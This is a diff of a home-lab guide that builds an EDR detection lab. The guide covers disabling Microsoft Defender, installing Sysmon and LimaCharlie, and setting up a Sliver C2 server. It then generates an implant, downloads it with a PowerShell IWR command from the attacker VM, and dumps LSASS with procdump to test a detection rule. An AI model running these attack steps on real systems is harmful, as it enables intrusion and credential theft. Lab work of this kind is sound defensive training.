@@ -16,7 +16,7 @@ Step 1 – Turn Off from Windows Security
   - Automatic sample submission
   - Tamper Protection
 
-    ![Resource Group Screenshot](Document_Images/images1.png)
+![Resource Group Screenshot](Document_Images/images1.png)
 
 Step 2 – Disable via Group Policy
 1. Press `Win + R`, type `gpedit.msc`, and press **Enter**.
@@ -24,7 +24,7 @@ Step 2 – Disable via Group Policy
 Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus
 3. Open **Turn off Microsoft Defender Antivirus** → Set to **Enabled** → Apply → OK.
 
-   ![Resource Group Screenshot](Document_Images/images2.png)
+![Resource Group Screenshot](Document_Images/images2.png)
 
 Step 3 – Disable via Registry
 
@@ -34,14 +34,14 @@ Step 3 – Disable via Registry
 .
 
 
-   ![Resource Group Screenshot](Document_Images/images3.png)
+![Resource Group Screenshot](Document_Images/images3.png)
 
  
 Step 4 – Boot into Safe Mode
 1. Run msconfig.exe.
 2. Under Boot, check Safe boot (Minimal) → Apply → OK → Restart.
 
-   ![Resource Group Screenshot](Document_Images/images4.png)
+![Resource Group Screenshot](Document_Images/images4.png)
 
 Step 5 – Disable Services in Safe Mode
 
@@ -54,12 +54,11 @@ Step 5 – Disable Services in Safe Mode
   -	`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WdNisSvc`
   -	`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WdFilter` 
 
-    ![Resource Group Screenshot](Document_Images/images5.png)
+![Resource Group Screenshot](Document_Images/images5.png)
 
 Step 6 – Return to Normal Boot
   -	In `msconfig.exe`, uncheck **Safe boot** and restart.
 
----
 
 ## 2. Install Sysmon on Windows VM
 
@@ -81,7 +80,6 @@ Step 4 – Install Sysmon :
 
 `C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml`
 
----
 
 ## 3. Install LimaCharlie Agent
 
@@ -90,32 +88,32 @@ Step 1 – Create Organization in LimaCharlie.io
 1. Log in to LimaCharlie.io.
 2. Create a new organization → Add sensor → Windows → Name: Windows VM Lab.
 
-   ![Resource Group Screenshot](Document_Images/images11.png)
+![Resource Group Screenshot](Document_Images/images11.png)
 
 
 Step 2 – Download and Install Agent
 
 1. Select the `x86-64.(exe)` sensor and hold on first.
 
- 	 ![Resource Group Screenshot](Document_Images/images13.png)
+![Resource Group Screenshot](Document_Images/images13.png)
    
 2. On the Windows VM, download:
 
 	`https://downloads.limacharlie.io/sensor/windows/64`
 
-   ![Resource Group Screenshot](Document_Images/images14.png)
+![Resource Group Screenshot](Document_Images/images14.png)
 
 3. In Command Prompt (Admin):
    1. `cd C:\Users\User\Downloads`
    2. `hcp_win_x64_release_4.33.13 -i <installation_key>`
       
-    ![Resource Group Screenshot](Document_Images/images15.png)  copy installation_key
+![Resource Group Screenshot](Document_Images/images15.png)  copy installation_key
 
-    ![Resource Group Screenshot](Document_Images/images16.png)
+![Resource Group Screenshot](Document_Images/images16.png)
 
 After installing the Limacharlie the webpage will appear "Detected new sensor!"
 
-   ![Resource Group Screenshot](Document_Images/images17.png)
+![Resource Group Screenshot](Document_Images/images17.png)
 
 Step 3 – Enable Sysmon Log Collection
 
@@ -129,11 +127,10 @@ Step 3 – Enable Sysmon Log Collection
 
   - Retention: `10 days`
     
-    ![Resource Group Screenshot](Document_Images/images18.png)
+![Resource Group Screenshot](Document_Images/images18.png)
 
-    ![Resource Group Screenshot](Document_Images/images19.png)
+![Resource Group Screenshot](Document_Images/images19.png)
 
----
 
 ## 4. Set Up Attack System (Sliver C2)
 
@@ -149,7 +146,7 @@ In this example:
 
 Tip: Write down your interface name and IP address; you’ll need them multiple times.
 
-   ![Resource Group Screenshot](Document_Images/images20.png)
+![Resource Group Screenshot](Document_Images/images20.png)
 
 
 3. Check the VM’s gateway:
@@ -158,7 +155,7 @@ bash
 
 "ping _gateway -c 1"
 
-   ![Resource Group Screenshot](Document_Images/images21.png)
+![Resource Group Screenshot](Document_Images/images21.png)
 
 Step 1 – Set Static IP on Ubuntu
 
@@ -182,7 +179,7 @@ yaml
 	 addresses: [8.8.8.8,8.8.4.4]
     version: 2 
 
-   ![Resource Group Screenshot](Document_Images/images22.png)
+![Resource Group Screenshot](Document_Images/images22.png)
 
 Apply and verify:
 
@@ -191,7 +188,7 @@ bash
 - `sudo netplan apply`
 - `ping 8.8.8.8`
 
-   ![Resource Group Screenshot](Document_Images/images23.png)
+![Resource Group Screenshot](Document_Images/images23.png)
 
 Step 2 – SSH into the Ubuntu VM from Windows
 
@@ -201,7 +198,7 @@ cmd
 
 `ssh user@[Linux_VM_IP]`
 
-   ![Resource Group Screenshot](Document_Images/images24.png)
+![Resource Group Screenshot](Document_Images/images24.png)
 
 Switch to root:
 
@@ -237,13 +234,13 @@ Step 1 – Launch Sliver Server
 
 `sliver-server`
 
-   ![Resource Group Screenshot](Document_Images/images25.png)
+![Resource Group Screenshot](Document_Images/images25.png)
 
 Step 2 – Generate Payload
 
 `generate --http [Linux_VM_IP] --save /opt/sliver`
 
-   ![Resource Group Screenshot](Document_Images/images26.png)
+![Resource Group Screenshot](Document_Images/images26.png)
 
 **Take note the output file will randomized name.**
 
@@ -252,7 +249,7 @@ Check implant list:
 
 `implants`
 
-   ![Resource Group Screenshot](Document_Images/images27.png)
+![Resource Group Screenshot](Document_Images/images27.png)
 
 Exit Sliver:
 
@@ -276,9 +273,8 @@ powershell
 
 `IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe`
 
-   ![Resource Group Screenshot](Document_Images/images28.png)
+![Resource Group Screenshot](Document_Images/images28.png)
 
----
 
 ## 5. Command and Control Session
 
@@ -292,7 +288,7 @@ On Windows:
 
 	`http`
 
-    ![Resource Group Screenshot](Document_Images/images29.png)
+![Resource Group Screenshot](Document_Images/images29.png)
    
 
 3. Return Windows VM and execute C2 payload from download location using administrative PowerShell prompt we had from before
@@ -304,7 +300,7 @@ poweshell
 
 4. After connect, you should see your session check in on Sliver server.
 
-   ![Resource Group Screenshot](Document_Images/images30.png)
+ ![Resource Group Screenshot](Document_Images/images30.png)
 
 
 5. On Windows verify your session in Sliver 
@@ -313,7 +309,7 @@ bash
 
 `sessions`
 
-   ![Resource Group Screenshot](Document_Images/images31.png)
+![Resource Group Screenshot](Document_Images/images31.png)
 
 6. To interact with your new C2 session, type following command into Sliver shell
 
@@ -321,7 +317,7 @@ bash
 
 `user [session_id]`
 
-   ![Resource Group Screenshot](Document_Images/images32.png)
+![Resource Group Screenshot](Document_Images/images32.png)
 
 
 7. Run some basic commands:
@@ -332,29 +328,29 @@ bash
 #privileges
 `getprivs`
 
-   ![Resource Group Screenshot](Document_Images/images33.png)
+![Resource Group Screenshot](Document_Images/images33.png)
 
 Examine network connections occurring on the remote system
 netstat
 
-   ![Resource Group Screenshot](Document_Images/images34.png)
+![Resource Group Screenshot](Document_Images/images34.png)
 
----
+
 
 ## 6.Observe EDR Telemetry in LimaCharlie
 Step 1 – Identify the Malicious Process
 1. In LimaCharlie, go to Sensors and select the Windows sensor
 
-   ![Resource Group Screenshot](Document_Images/images35.png)
+ ![Resource Group Screenshot](Document_Images/images35.png)
 
 2. In the left-hand menu, click Processes.
 Look for the suspicious process `NEAT_PUFFIN.exe` and note the source IP address.
 
-   ![Resource Group Screenshot](Document_Images/images36.png) ![Resource Group Screenshot](Document_Images/images37.png)
+![Resource Group Screenshot](Document_Images/images36.png) ![Resource Group Screenshot](Document_Images/images37.png)
 
 3. Check the Network tab — you should also see `NEAT_PUFFIN.exe` appearing in network connection logs.
 
-   ![Resource Group Screenshot](Document_Images/images38.png) ![Resource Group Screenshot](Document_Images/images39.png)
+![Resource Group Screenshot](Document_Images/images38.png) ![Resource Group Screenshot](Document_Images/images39.png)
 
 Step 2 – Search for Suspicious Activity
 1. Open the Timeline view.
@@ -364,12 +360,12 @@ Step 2 – Search for Suspicious Activity
 
 3. Select any matching event where the system is accessing `lsass.exe` — this is often used for credential dumping.
    
-    ![Resource Group Screenshot](Document_Images/images40.png)
+   ![Resource Group Screenshot](Document_Images/images40.png)
    
 Step 3 – Create a Detection & Response (D&R) Rule
 1. Click Build D&R Rule.
    
-   ![Resource Group Screenshot](Document_Images/images41.png)
+![Resource Group Screenshot](Document_Images/images41.png)
 
 2. In the Detect section, replace all contents with:
    
@@ -383,18 +379,18 @@ value: lsass.exe`
 ` - action: report
   name: LSASS access`
 
-   ![Resource Group Screenshot](Document_Images/images42.png)
+![Resource Group Screenshot](Document_Images/images42.png)
 
 Step 4 – Test the Detection
 1. From your Sliver server console, run:
 
 `procdump -n lsass.exe -s lsass.dmp`
 
-   ![Resource Group Screenshot](Document_Images/images43.png)
+![Resource Group Screenshot](Document_Images/images43.png)
 
 2. Go to LimaCharlie → Detections and confirm the `LSASS access` report appears.
 
-   ![Resource Group Screenshot](Document_Images/images44.png) 
+![Resource Group Screenshot](Document_Images/images44.png) 
 
 ## 🎥 Watch Simulated LSASS Dump — EDR Detection in LimaCharlie Demo Video
 
